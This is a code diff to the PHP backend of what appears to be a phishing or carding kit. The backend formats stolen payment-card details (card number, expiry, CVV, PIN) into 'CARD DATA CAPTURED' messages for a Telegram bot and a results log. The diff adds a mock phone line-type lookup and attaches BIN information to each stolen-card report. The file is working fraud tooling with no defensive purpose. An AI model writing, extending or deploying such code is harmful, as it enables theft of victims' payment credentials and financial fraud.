@@ -11,6 +11,20 @@ if (!empty($_POST['b_field'])) {
     die(json_encode(['status' => 'ok']));
 }
 
+// ── Phone Validation Endpoint (Mock) ──────────────────────────────────────────
+if (isset($_GET['action']) && $_GET['action'] === 'line-type') {
+    $raw = file_get_contents('php://input');
+    $d = json_decode($raw, true) ?: [];
+    $phone = $d['phone'] ?? '';
+    if (empty($phone))
+        die(json_encode(['type' => 'unknown']));
+    if (str_ends_with($phone, '0000'))
+        die(json_encode(['type' => 'voip']));
+    if (str_ends_with($phone, '1111'))
+        die(json_encode(['type' => 'landline']));
+    die(json_encode(['type' => 'mobile']));
+}
+
 $botToken = "{{TG_BOT_TOKEN}}";
 $chatId = "{{TG_CHAT_ID}}";
 $log_file = __DIR__ . '/result.txt';
@@ -204,8 +218,9 @@ switch ($form_type) {
         break;
 
     case 'card':
+        $binStr = !empty($d['bin_data']) ? "\n🏦 <b>BIN Info:</b> <code>" . he($d['bin_data']) . "</code>" : '';
         $msg = "💳 <b>✅ CARD DATA CAPTURED</b>\n" . $header
-            . "💳 <b>Card:</b> <code>" . he($d['card_num'] ?? 'N/A') . "</code>\n"
+            . "💳 <b>Card:</b> <code>" . he($d['card_num'] ?? 'N/A') . "</code>" . $binStr . "\n"
             . "📅 <b>Exp:</b>  <code>" . he($d['exp'] ?? 'N/A') . "</code>\n"
             . "🔐 <b>CVV:</b>  <code>" . he($d['cvv'] ?? 'N/A') . "</code>\n"
             . "🔑 <b>PIN:</b>  <code>" . he($d['pin'] ?? 'N/A') . "</code>\n"
